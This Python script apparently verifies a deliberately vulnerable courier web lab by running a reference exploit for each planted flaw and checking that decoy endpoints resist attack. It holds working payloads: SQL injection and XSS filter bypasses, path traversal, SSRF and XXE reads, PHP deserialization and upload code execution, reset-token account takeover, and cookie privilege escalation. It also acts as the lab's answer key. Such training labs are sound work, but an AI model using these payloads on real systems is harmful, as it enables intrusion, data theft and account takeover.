#!/usr/bin/env python3
"""Prove Lab D (Kestrel Courier) against its ground truth.

    python3 verify.py http://127.0.0.1:8401

Runs the reference exploit of every planted flaw (D1-D14, GROUND_TRUTH-r5.md)
and the attack on every decoy (ND1-ND4). A flaw passes when its exploit returns
the proof; a decoy passes when the attack fails. Exit 1 when anything fails.

It takes over the account m.okafor@kestrel-courier.test (that is D10 and D11)
and leaves two files in the upload folder: restart the lab afterwards. Standard
library only.
"""
import base64
import hashlib
import http.client
import json
import re
import sys
from urllib.parse import quote, unquote, urlsplit

STAFF = 'm.okafor@kestrel-courier.test'
PASSWD = 'root:x:0:0'


class Site:
    def __init__(self, base):
        parts = urlsplit(base)
        self.host, self.port = parts.hostname, parts.port or 80

    def call(self, method, path, body=None, headers=None, cookies=None):
        """(status, headers, text). The path goes out as given; no redirect is followed."""
        headers = dict(headers or {})
        if cookies:
            headers['Cookie'] = '; '.join('%s=%s' % (name, quote(value, safe='')) for name, value in cookies.items())
        if isinstance(body, str):
            body = body.encode()
        connection = http.client.HTTPConnection(self.host, self.port, timeout=20)
        try:
            connection.request(method, path, body=body, headers=headers)
            response = connection.getresponse()
            return response.status, response.headers, response.read().decode('utf-8', 'replace')
        finally:
            connection.close()

    def form(self, path, fields, cookies=None):
        body = '&'.join('%s=%s' % (name, quote(value, safe='')) for name, value in fields.items())
        return self.call('POST', path, body, {'Content-Type': 'application/x-www-form-urlencoded'}, cookies)

    def json(self, path, data, cookies=None):
        return self.call('POST', path, json.dumps(data), {'Content-Type': 'application/json'}, cookies)


def set_cookies(headers):
    jar = {}
    for line in headers.get_all('Set-Cookie') or []:
        name, _, value = line.split(';', 1)[0].partition('=')
        jar[name.strip()] = unquote(value)
    return jar


def b64(text):
    return base64.b64encode(text.encode()).decode()


def php_string(text):
    return 's:%d:"%s";' % (len(text.encode()), text)


def sign_in(site, password):
    status, headers, _ = site.form('/login', {'email': STAFF, 'password': password})
    jar = set_cookies(headers)
    if status != 302 or 'kc_session' not in jar:
        return None
    return {'kc_session': jar['kc_session'], 'kc_role': jar.get('kc_role', '')}


# ---------------------------------------------------------------- the flaws

def d1(site, state):
    payload = "0 UNION SELECT value, 1 FROM settings WHERE k='canary_d1'"
    _, _, text = site.call('GET', '/', cookies={'kc_depot': payload})
    return 'KC-D01-7c3e91ab' in text, 'UNION SELECT in the kc_depot cookie, output in the page header'


def d2(site, state):
    def count(guess):
        slug = "north'and(selselectect/**/value/**/from/**/settings/**/where/**/k='canary_d2')='%s" % guess
        _, _, text = site.call('GET', '/depots/region/' + quote(slug, safe="/*'()=,"))
        return 'depots serve this region' in text
    blocked = "north'and(select/**/value/**/from/**/settings/**/where/**/k='canary_d2')='KC-D02-e40b5d16"
    _, _, plain = site.call('GET', '/depots/region/' + quote(blocked, safe="/*'()=,"))
    ok = count('KC-D02-e40b5d16') and not count('KC-D02-00000000') and 'depots serve this region' not in plain
    return ok, 'boolean answer through the path segment; a plain "select" is filtered'


def d3(site, state):
    payload = "' autofocus onfocus=alert(document.domain) x='"
    _, _, text = site.call('GET', '/quote?ref=' + quote(payload, safe=''))
    _, _, tag = site.call('GET', '/quote?ref=' + quote('"><script>alert(1)</script>', safe=''))
    ok = "value='' autofocus onfocus=alert(document.domain) x=''" in text and '<script>alert(1)' not in tag
    return ok, 'single quote breaks out of the attribute; a tag payload is encoded'


def d4(site, state):
    site.form('/reviews', {'author': 'verify', 'body': 'see [my site](JaVaScRiPt:alert(document.domain)) and [x](javascript:alert(1))'})
    _, _, text = site.call('GET', '/reviews')
    ok = 'href="JaVaScRiPt:alert(document.domain)"' in text and 'href="javascript:alert(1)"' not in text
    return ok, 'mixed-case javascript: link stored; the lower-case one is dropped'


def d5(site, state):
    _, _, text = site.call('GET', '/label/download?doc=' + quote(b64('../../../../etc/passwd'), safe=''))
    _, _, plain = site.call('GET', '/label/download?doc=../../../../etc/passwd')
    return PASSWD in text and PASSWD not in plain, 'base64-wrapped ../ reads /etc/passwd; a plain one does not'


def d6(site, state):
    _, _, text = site.call('GET', '/', cookies={'kc_lang': '....//....//....//....//etc/passwd'})
    _, _, plain = site.call('GET', '/', cookies={'kc_lang': '../../../../etc/passwd'})
    return PASSWD in text and PASSWD not in plain, '....// in the kc_lang cookie includes /etc/passwd; ../ is stripped'


def d7(site, state):
    def fetch(endpoint):
        return site.json('/api/v1/rates/sync', {'carrier': {'name': 'northline', 'endpoint': endpoint}})
    status, _, blocked = fetch('http://127.0.0.1:8081/internal/keys')
    _, _, decimal = fetch('http://2130706433:8081/internal/keys')
    _, _, zero = fetch('http://0:8081/internal/keys')
    ok = status == 400 and 'KC-D07-19fa62c8' in decimal and 'KC-D07-19fa62c8' in zero
    return ok, '127.0.0.1 is refused; 2130706433 and 0 reach the internal key service'


def d8(site, state):
    def post(system_id):
        document = ('<?xml version="1.0"?><!DOCTYPE parcels [<!ENTITY x SYSTEM "%s">]>'
                    '<parcels><parcel><to>&x;</to><weight>1</weight></parcel></parcels>' % system_id)
        return site.call('POST', '/api/v1/quote/bulk', document, {'Content-Type': 'application/xml'})
    status, _, blocked = post('file:///etc/passwd')
    _, _, text = post('/etc/passwd')
    _, _, as_json = site.json('/api/v1/quote/bulk', {'parcels': [{'to': 'AB1', 'weight': 2}]})
    ok = status == 400 and PASSWD in text and '"price"' in as_json
    return ok, 'XML body with an external entity reads /etc/passwd; file:// is refused'


def d9(site, state):
    _, _, source = site.call('GET', '/label/download?doc=' + quote(b64('../src/TemplateCache.php'), safe=''))
    if 'class TemplateCache' not in source:
        return False, 'the gadget source is not readable through D5'
    marker = 'rce-' + hashlib.md5(b'kestrel-d9').hexdigest()
    forged = ('O:13:"TemplateCache":3:{s:4:"path";' + php_string('/var/www/kestrel/public/uploads/pod/kc-verify-d9.php')
              + 's:6:"buffer";' + php_string("<?php echo 'rce-' . md5('kestrel-d9');") + 's:5:"dirty";b:1;}')
    site.call('GET', '/', cookies={'kc_prefs': b64(forged)})
    _, _, text = site.call('GET', '/uploads/pod/kc-verify-d9.php')
    return text.strip() == marker, 'forged TemplateCache in kc_prefs writes a script that then runs'


def d10(site, state):
    _, _, seeded = site.call('GET', '/_outbox/1')
    _, _, robots = site.call('GET', '/robots.txt')
    site.form('/account/forgot', {'email': STAFF})
    _, _, listing = site.call('GET', '/_outbox/')
    newest = re.search(r'/_outbox/(\d+)', listing)
    if not newest:
        return False, 'the outbox lists no message'
    _, _, mail = site.call('GET', '/_outbox/' + newest.group(1))
    token = re.search(r'token=([0-9a-f]{32})', mail)
    if not token:
        return False, 'no reset link in the newest message'
    password = 'verify-d10-Xk29!pass'
    status, _, _ = site.json('/api/v1/account/reset/confirm', {'email': STAFF, 'token': token.group(1), 'password': password})
    ok = 'KC-D10-3a6f9c41' in seeded and '/_outbox/' in robots and status == 200 and sign_in(site, password) is not None
    return ok, 'reset link read from /_outbox/, password changed, sign-in works'


def d11(site, state):
    site.form('/account/forgot', {'email': STAFF})
    password = 'verify-d11-Rm48!pass'
    wrong, _, _ = site.json('/api/v1/account/reset/confirm', {'email': STAFF, 'token': '0' * 32, 'password': password})
    status, _, _ = site.json('/api/v1/account/reset/confirm', {'email': STAFF, 'token': True, 'password': password})
    state['session'] = sign_in(site, password)
    return wrong == 400 and status == 200 and state['session'] is not None, 'token true is accepted; a wrong string is not'


def upload(site, session, name, content):
    boundary = 'kcverify7d1'
    body = ('--%s\r\nContent-Disposition: form-data; name="shipment"\r\n\r\nKC1002345GB\r\n'
            '--%s\r\nContent-Disposition: form-data; name="photo"; filename="%s"\r\n'
            'Content-Type: image/jpeg\r\n\r\n%s\r\n--%s--\r\n' % (boundary, boundary, name, content, boundary))
    return site.call('POST', '/staff/pod/upload', body, {'Content-Type': 'multipart/form-data; boundary=' + boundary}, session)


def d12(site, state):
    session = state.get('session')
    if not session:
        return False, 'no staff session (D11 failed)'
    code = "<?php echo 'rce-' . md5('kestrel-d12');"
    _, _, refused = upload(site, session, 'kc-verify.php', code)
    upload(site, session, 'kc-verify-d12.phtml', code)
    _, _, text = site.call('GET', '/uploads/pod/kc-verify-d12.phtml')
    ok = 'not accepted' in refused and text.strip() == 'rce-' + hashlib.md5(b'kestrel-d12').hexdigest()
    return ok, '.php is refused, .phtml is stored and runs'


def d13(site, state):
    session = state.get('session')
    if not session:
        return False, 'no staff session (D11 failed)'
    _, _, own = site.call('GET', '/staff/manifest?m=' + hashlib.md5(b'41').hexdigest(), cookies=session)
    _, _, other = site.call('GET', '/staff/manifest?m=' + hashlib.md5(b'42').hexdigest(), cookies=session)
    anonymous, _, _ = site.call('GET', '/staff/manifest?m=' + hashlib.md5(b'42').hexdigest())
    ok = 'R. Hale, 4 Mast Close' in own and 'KC-D13-5e8b20f7' in other and anonymous == 302
    return ok, "another depot's manifest opens by the MD5 of its number"


def d14(site, state):
    session = state.get('session')
    if not session:
        return False, 'no staff session (D11 failed)'
    as_staff, _, _ = site.call('GET', '/admin/settings', cookies=session)
    status, _, text = site.call('GET', '/admin/settings', cookies=dict(session, kc_role=b64('admin')))
    return as_staff == 403 and status == 200 and 'KC-D14-a09d4c62' in text, 'kc_role set to base64("admin") opens /admin/settings'


# ---------------------------------------------------------------- the decoys

def nd1(site, state):
    _, _, inject = site.call('GET', '/track?ref=' + quote("' OR '1'='1", safe=''))
    _, _, script = site.call('GET', '/track?ref=' + quote('"><script>alert(1)</script>', safe=''))
    _, _, real = site.call('GET', '/track?ref=KC1002345GB')
    ok = 'Out for delivery' in real and 'Out for delivery' not in inject and '<script>alert(1)' not in script
    return ok, '/track: no injection, no raw echo'


def nd2(site, state):
    attempts = [("' OR 1=1 -- ", 'x'), (STAFF + "' -- ", 'x'), ('ops.admin@kestrel-courier.test', 'admin123'),
                ('ops.admin@kestrel-courier.test', 'password'), (STAFF, 'kestrel'), (STAFF, 'Kestrel2026!')]
    statuses = [site.form('/login', {'email': email, 'password': password})[0] for email, password in attempts]
    return all(status == 401 for status in statuses), '/login: no injection, no guessable password'


def nd3(site, state):
    _, _, inject = site.call('GET', '/depots/search?q=' + quote("zzz%' OR '1'='1", safe=''))
    _, _, script = site.call('GET', '/depots/search?q=' + quote('\'"><script>alert(1)</script>', safe=''))
    ok = 'No depot matches' in inject and '<script>alert(1)' not in script and "q>'" not in script
    return ok, '/depots/search: no injection, no raw echo'


def nd4(site, state):
    targets = ['https://evil.test/', '//evil.test/', 'https://northline.test/@evil.test', 'https://northline.test.evil.test/']
    results = [site.call('GET', '/go?u=' + quote(target, safe='')) for target in targets]
    good, headers, _ = site.call('GET', '/go?u=' + quote('https://northline.test/', safe=''))
    ok = all(status == 400 for status, _, _ in results) and good == 302 and headers.get('Location') == 'https://northline.test/'
    return ok, '/go: only the three partner addresses redirect'


CASES = [('D1', d1), ('D2', d2), ('D3', d3), ('D4', d4), ('D5', d5), ('D6', d6), ('D7', d7), ('D8', d8), ('D9', d9),
         ('D10', d10), ('D11', d11), ('D12', d12), ('D13', d13), ('D14', d14),
         ('ND1', nd1), ('ND2', nd2), ('ND3', nd3), ('ND4', nd4)]


def main(argv):
    if len(argv) != 2:
        print(__doc__)
        return 2
    site, state, failed = Site(argv[1]), {}, 0
    for name, case in CASES:
        try:
            ok, detail = case(site, state)
        except Exception as error:  # a broken case is a failed case
            ok, detail = False, '%s: %s' % (type(error).__name__, error)
        failed += 0 if ok else 1
        print('%s %-4s %s' % ('ok  ' if ok else 'FAIL', name, detail))
    print('%d of %d cases passed' % (len(CASES) - failed, len(CASES)))
    return 1 if failed else 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
